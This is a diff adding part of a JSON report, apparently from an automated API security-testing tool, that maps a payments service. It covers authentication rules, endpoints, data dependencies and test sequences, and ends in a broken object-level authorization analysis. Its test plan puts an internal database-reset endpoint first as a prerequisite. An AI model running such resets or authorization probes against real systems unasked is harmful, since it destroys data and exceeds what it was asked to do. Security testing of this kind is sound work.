+          "mechanisms": [
+            "bearerAuth"
+          ],
+          "authorization": {
+            "type": "ownership",
+            "owner_field": "customer_id"
+          }
+        },
+        "/internal/*": {
+          "required": true,
+          "mechanisms": [
+            "bearerAuth"
+          ],
+          "authorization": {
+            "type": "role",
+            "required_roles": [
+              "admin"
+            ]
+          }
+        }
+      },
+      "test_sequence": [
+        {
+          "step": 1,
+          "description": "Obtain access token",
+          "endpoint": "/api/v1/auth/login",
+          "method": "POST",
+          "body": {
+            "username": "test_user",
+            "password": "test_password"
+          },
+          "extract": {
+            "access_token": "$.access_token"
+          }
+        },
+        {
+          "step": 2,
+          "description": "Use token for protected endpoints",
+          "header": "Authorization: Bearer {access_token}"
+        }
+      ],
+      "summary": "API uses JWT bearer token authentication with role-based and ownership-based authorization"
+    },
+    "dependencies": {
+      "resources": [
+        {
+          "name": "internal",
+          "base_path": "/internal/admin",
+          "endpoints": [
+            {
+              "method": "DELETE",
+              "path": "/internal/admin/transactions/{transaction_id}",
+              "operation": "delete"
+            },
+            {
+              "method": "DELETE",
+              "path": "/internal/admin/transactions/{transaction_id}",
+              "operation": "delete"
+            },
+            {
+              "method": "POST",
+              "path": "/internal/admin/database/reset",
+              "operation": "reset"
+            },
+            {
+              "method": "POST",
+              "path": "/internal/admin/export",
+              "operation": "export"
+            },
+            {
+              "method": "POST",
+              "path": "/internal/admin/refund-batch",
+              "operation": "refund_batch"
+            }
+          ],
+          "crud_complete": false
+        },
+        {
+          "name": "billing",
+          "base_path": "/api/v1/billing",
+          "endpoints": [
+            {
+              "method": "GET",
+              "path": "/api/v1/billing/invoices/{invoice_id}",
+              "operation": "read"
+            },
+            {
+              "method": "GET",
+              "path": "/api/v1/billing/invoices/{invoice_id}/pay",
+              "operation": "pay"
+            },
+            {
+              "method": "POST",
+              "path": "/api/v1/billing/invoices/{invoice_id}/pay",
+              "operation": "pay"
+            },
+            {
+              "method": "POST",
+              "path": "/api/v1/billing/invoices/{invoice_id}/pay",
+              "operation": "pay"
+            },
+            {
+              "method": "GET",
+              "path": "/api/v1/billing/invoices",
+              "operation": "list"
+            }
+          ],
+          "crud_complete": false
+        },
+        {
+          "name": "subscriptions",
+          "base_path": "/api/v1/subscriptions",
+          "endpoints": [
+            {
+              "method": "DELETE",
+              "path": "/api/v1/subscriptions/{subscription_id}",
+              "operation": "delete"
+            },
+            {
+              "method": "DELETE",
+              "path": "/api/v1/subscriptions/{subscription_id}",
+              "operation": "delete"
+            },
+            {
+              "method": "GET",
+              "path": "/api/v1/subscriptions/{subscription_id}",
+              "operation": "read"
+            },
+            {
+              "method": "GET",
+              "path": "/api/v1/subscriptions",
+              "operation": "list"
+            },
+            {
+              "method": "POST",
+              "path": "/api/v1/subscriptions",
+              "operation": "create"
+            }
+          ],
+          "crud_complete": true
+        },
+        {
+          "name": "payment-methods",
+          "base_path": "/api/v1/payment-methods",
+          "endpoints": [
+            {
+              "method": "GET",
+              "path": "/api/v1/payment-methods",
+              "operation": "list"
+            },
+            {
+              "method": "GET",
+              "path": "/api/v1/payment-methods",
+              "operation": "list"
+            }
+          ],
+          "crud_complete": false
+        },
+        {
+          "name": "payments",
+          "base_path": "/api/v1/payments",
+          "endpoints": [
+            {
+              "method": "POST",
+              "path": "/api/v1/payments/{transaction_id}/capture",
+              "operation": "capture"
+            },
+            {
+              "method": "POST",
+              "path": "/api/v1/payments/{transaction_id}/void",
+              "operation": "void"
+            },
+            {
+              "method": "GET",
+              "path": "/api/v1/payments/{transaction_id}/capture",
+              "operation": "read_capture"
+            },
+            {
+              "method": "GET",
+              "path": "/api/v1/payments/{transaction_id}/void",
+              "operation": "read_void"
+            },
+            {
+              "method": "GET",
+              "path": "/api/v1/payments",
+              "operation": "list"
+            },
+            {
+              "method": "POST",
+              "path": "/api/v1/payments",
+              "operation": "create"
+            },
+            {
+              "method": "GET",
+              "path": "/api/v1/payments/{transaction_id}",
+              "operation": "read"
+            }
+          ],
+          "crud_complete": true
+        },
+        {
+          "name": "currencies",
+          "base_path": "/api/v1/currencies",
+          "endpoints": [
+            {
+              "method": "GET",
+              "path": "/api/v1/currencies",
+              "operation": "list"
+            },
+            {
+              "method": "GET",
+              "path": "/api/v1/currencies",
+              "operation": "list"
+            },
+            {
+              "method": "ANY",
+              "path": "/api/v1/currencies",
+              "operation": "any"
+            }
+          ],
+          "crud_complete": false
+        },
+        {
+          "name": "refunds",
+          "base_path": "/api/v1/refunds",
+          "endpoints": [
+            {
+              "method": "GET",
+              "path": "/api/v1/refunds",
+              "operation": "list"
+            },
+            {
+              "method": "POST",
+              "path": "/api/v1/refunds",
+              "operation": "create"
+            },
+            {
+              "method": "GET",
+              "path": "/api/v1/refunds/{refund_id}",
+              "operation": "read"
+            },
+            {
+              "method": "POST",
+              "path": "/api/v1/refunds",
+              "operation": "create"
+            },
+            {
+              "method": "GET",
+              "path": "/api/v1/refunds/{refund_id}",
+              "operation": "read"
+            }
+          ],
+          "crud_complete": true
+        },
+        {
+          "name": "webhooks",
+          "base_path": "/webhooks",
+          "endpoints": [
+            {
+              "method": "POST",
+              "path": "/webhooks/paypal",
+              "operation": "paypal"
+            },
+            {
+              "method": "POST",
+              "path": "/webhooks/stripe",
+              "operation": "stripe"
+            },
+            {
+              "method": "POST",
+              "path": "/webhooks/stripe",
+              "operation": "stripe"
+            },
+            {
+              "method": "POST",
+              "path": "/webhooks/paypal",
+              "operation": "paypal"
+            }
+          ],
+          "crud_complete": false
+        },
+        {
+          "name": "health",
+          "base_path": "/health",
+          "endpoints": [
+            {
+              "method": "GET",
+              "path": "/health/live",
+              "operation": "live"
+            },
+            {
+              "method": "GET",
+              "path": "/health/ready",
+              "operation": "ready"
+            },
+            {
+              "method": "GET",
+              "path": "/health/live",
+              "operation": "live"
+            },
+            {
+              "method": "GET",
+              "path": "/health/ready",
+              "operation": "ready"
+            }
+          ],
+          "crud_complete": false
+        }
+      ],
+      "dependencies": [
+        {
+          "from": {
+            "method": "POST",
+            "path": "/api/v1/payments"
+          },
+          "to": {
+            "method": "GET",
+            "path": "/api/v1/payments/{transaction_id}"
+          },
+          "type": "data_dependency",
+          "description": "Payment creation returns transaction ID for retrieval",
+          "data_flow": {
+            "produces": [
+              "transaction_id"
+            ],
+            "consumes": [
+              "transaction_id"
+            ]
+          }
+        },
+        {
+          "from": {
+            "method": "POST",
+            "path": "/api/v1/payments"
+          },
+          "to": {
+            "method": "POST",
+            "path": "/api/v1/payments/{transaction_id}/capture"
+          },
+          "type": "data_dependency",
+          "description": "Payment capture requires transaction ID from payment creation",
+          "data_flow": {
+            "produces": [
+              "transaction_id"
+            ],
+            "consumes": [
+              "transaction_id"
+            ]
+          }
+        },
+        {
+          "from": {
+            "method": "POST",
+            "path": "/api/v1/payments"
+          },
+          "to": {
+            "method": "POST",
+            "path": "/api/v1/payments/{transaction_id}/void"
+          },
+          "type": "data_dependency",
+          "description": "Payment void requires transaction ID from payment creation",
+          "data_flow": {
+            "produces": [
+              "transaction_id"
+            ],
+            "consumes": [
+              "transaction_id"
+            ]
+          }
+        },
+        {
+          "from": {
+            "method": "POST",
+            "path": "/api/v1/refunds"
+          },
+          "to": {
+            "method": "GET",
+            "path": "/api/v1/refunds/{refund_id}"
+          },
+          "type": "data_dependency",
+          "description": "Refund creation returns refund ID for retrieval",
+          "data_flow": {
+            "produces": [
+              "refund_id"
+            ],
+            "consumes": [
+              "refund_id"
+            ]
+          }
+        },
+        {
+          "from": {
+            "method": "POST",
+            "path": "/api/v1/subscriptions"
+          },
+          "to": {
+            "method": "GET",
+            "path": "/api/v1/subscriptions/{subscription_id}"
+          },
+          "type": "data_dependency",
+          "description": "Subscription creation returns subscription ID for retrieval",
+          "data_flow": {
+            "produces": [
+              "subscription_id"
+            ],
+            "consumes": [
+              "subscription_id"
+            ]
+          }
+        },
+        {
+          "from": {
+            "method": "POST",
+            "path": "/api/v1/subscriptions"
+          },
+          "to": {
+            "method": "DELETE",
+            "path": "/api/v1/subscriptions/{subscription_id}"
+          },
+          "type": "data_dependency",
+          "description": "Subscription deletion requires subscription ID from creation",
+          "data_flow": {
+            "produces": [
+              "subscription_id"
+            ],
+            "consumes": [
+              "subscription_id"
+            ]
+          }
+        },
+        {
+          "from": {
+            "method": "POST",
+            "path": "/internal/admin/database/reset"
+          },
+          "to": {
+            "method": "GET",
+            "path": "/api/v1/billing/invoices"
+          },
+          "type": "state_dependency",
+          "description": "Database reset clears invoices, so invoices list must be tested after reset"
+        },
+        {
+          "from": {
+            "method": "POST",
+            "path": "/internal/admin/database/reset"
+          },
+          "to": {
+            "method": "GET",
+            "path": "/api/v1/payments"
+          },
+          "type": "state_dependency",
+          "description": "Database reset clears payments, so payments list must be tested after reset"
+        },
+        {
+          "from": {
+            "method": "POST",
+            "path": "/internal/admin/database/reset"
+          },
+          "to": {
+            "method": "GET",
+            "path": "/api/v1/refunds"
+          },
+          "type": "state_dependency",
+          "description": "Database reset clears refunds, so refunds list must be tested after reset"
+        },
+        {
+          "from": {
+            "method": "POST",
+            "path": "/internal/admin/database/reset"
+          },
+          "to": {
+            "method": "GET",
+            "path": "/api/v1/subscriptions"
+          },
+          "type": "state_dependency",
+          "description": "Database reset clears subscriptions, so subscriptions list must be tested after reset"
+        }
+      ],
+      "test_sequences": [
+        {
+          "sequence_id": 1,
+          "name": "Payment Workflow",
+          "description": "Test complete payment lifecycle",
+          "steps": [
+            {
+              "step": 1,
+              "method": "POST",
+              "path": "/api/v1/payments",
+              "description": "Create new payment",
+              "extract": {
+                "transaction_id": "$.id"
+              }
+            },
+            {
+              "step": 2,
+              "method": "GET",
+              "path": "/api/v1/payments/{transaction_id}",
+              "description": "Retrieve created payment",
+              "requires": [
+                "transaction_id"
+              ],
+              "path_params": {
+                "transaction_id": "{transaction_id}"
+              }
+            },
+            {
+              "step": 3,
+              "method": "POST",
+              "path": "/api/v1/payments/{transaction_id}/capture",
+              "description": "Capture payment",
+              "requires": [
+                "transaction_id"
+              ],
+              "path_params": {
+                "transaction_id": "{transaction_id}"
+              }
+            },
+            {
+              "step": 4,
+              "method": "POST",
+              "path": "/api/v1/payments/{transaction_id}/void",
+              "description": "Void payment",
+              "requires": [
+                "transaction_id"
+              ],
+              "path_params": {
+                "transaction_id": "{transaction_id}"
+              }
+            }
+          ]
+        },
+        {
+          "sequence_id": 2,
+          "name": "Refund Workflow",
+          "description": "Test refund creation and retrieval",
+          "steps": [
+            {
+              "step": 1,
+              "method": "POST",
+              "path": "/api/v1/refunds",
+              "description": "Create new refund",
+              "extract": {
+                "refund_id": "$.id"
+              }
+            },
+            {
+              "step": 2,
+              "method": "GET",
+              "path": "/api/v1/refunds/{refund_id}",
+              "description": "Retrieve created refund",
+              "requires": [
+                "refund_id"
+              ],
+              "path_params": {
+                "refund_id": "{refund_id}"
+              }
+            }
+          ]
+        },
+        {
+          "sequence_id": 3,
+          "name": "Subscription Lifecycle",
+          "description": "Test subscription CRUD operations",
+          "steps": [
+            {
+              "step": 1,
+              "method": "POST",
+              "path": "/api/v1/subscriptions",
+              "description": "Create new subscription",
+              "extract": {
+                "subscription_id": "$.id"
+              }
+            },
+            {
+              "step": 2,
+              "method": "GET",
+              "path": "/api/v1/subscriptions/{subscription_id}",
+              "description": "Retrieve created subscription",
+              "requires": [
+                "subscription_id"
+              ],
+              "path_params": {
+                "subscription_id": "{subscription_id}"
+              }
+            },
+            {
+              "step": 3,
+              "method": "DELETE",
+              "path": "/api/v1/subscriptions/{subscription_id}",
+              "description": "Delete subscription",
+              "requires": [
+                "subscription_id"
+              ],
+              "path_params": {
+                "subscription_id": "{subscription_id}"
+              }
+            }
+          ]
+        }
+      ],
+      "prerequisite_endpoints": [
+        {
+          "method": "POST",
+          "path": "/internal/admin/database/reset",
+          "reason": "Required to reset database state before testing",
+          "priority": 1
+        }
+      ],
+      "dependency_graph": {
+        "nodes": [
+          {
+            "id": "POST /internal/admin/database/reset",
+            "type": "state_reset"
+          },
+          {
+            "id": "POST /api/v1/payments",
+            "type": "create"
+          },
+          {
+            "id": "GET /api/v1/payments/{transaction_id}",
+            "type": "read"
+          },
+          {
+            "id": "POST /api/v1/payments/{transaction_id}/capture",
+            "type": "update"
+          },
+          {
+            "id": "POST /api/v1/payments/{transaction_id}/void",
+            "type": "update"
+          },
+          {
+            "id": "POST /api/v1/refunds",
+            "type": "create"
+          },
+          {
+            "id": "GET /api/v1/refunds/{refund_id}",
+            "type": "read"
+          },
+          {
+            "id": "POST /api/v1/subscriptions",
+            "type": "create"
+          },
+          {
+            "id": "GET /api/v1/subscriptions/{subscription_id}",
+            "type": "read"
+          },
+          {
+            "id": "DELETE /api/v1/subscriptions/{subscription_id}",
+            "type": "delete"
+          }
+        ],
+        "edges": [
+          {
+            "from": "POST /internal/admin/database/reset",
+            "to": "POST /api/v1/payments",
+            "type": "state_reset"
+          },
+          {
+            "from": "POST /api/v1/payments",
+            "to": "GET /api/v1/payments/{transaction_id}",
+            "type": "data"
+          },
+          {
+            "from": "POST /api/v1/payments",
+            "to": "POST /api/v1/payments/{transaction_id}/capture",
+            "type": "data"
+          },
+          {
+            "from": "POST /api/v1/payments",
+            "to": "POST /api/v1/payments/{transaction_id}/void",
+            "type": "data"
+          },
+          {
+            "from": "POST /api/v1/refunds",
+            "to": "GET /api/v1/refunds/{refund_id}",
+            "type": "data"
+          },
+          {
+            "from": "POST /api/v1/subscriptions",
+            "to": "GET /api/v1/subscriptions/{subscription_id}",
+            "type": "data"
+          },
+          {
+            "from": "POST /api/v1/subscriptions",
+            "to": "DELETE /api/v1/subscriptions/{subscription_id}",
+            "type": "data"
+          }
+        ]
+      },
+      "summary": "Analyzed 74 endpoints, found 9 resources, 10 dependencies, generated 3 test sequences"
+    },
+    "bola_analysis": {
+      "endpoints_analyzed": 19,
+      "endpoints_pre_filtered": 74,
+      "applied": 23,
+      "shared_auth_patterns": [
+        {
+          "pattern": "get_current_user",
+          "description": "Dependency to extract current user from request context",
+          "endpoints_using": [
+            "/api/v1/payments/{transaction_id}",
+            "/api/v1/refunds/{refund_id}",
+            "/api/v1/subscriptions/{subscription_id}"
+          ]
+        }
+      ]
+    }
+  }
+}
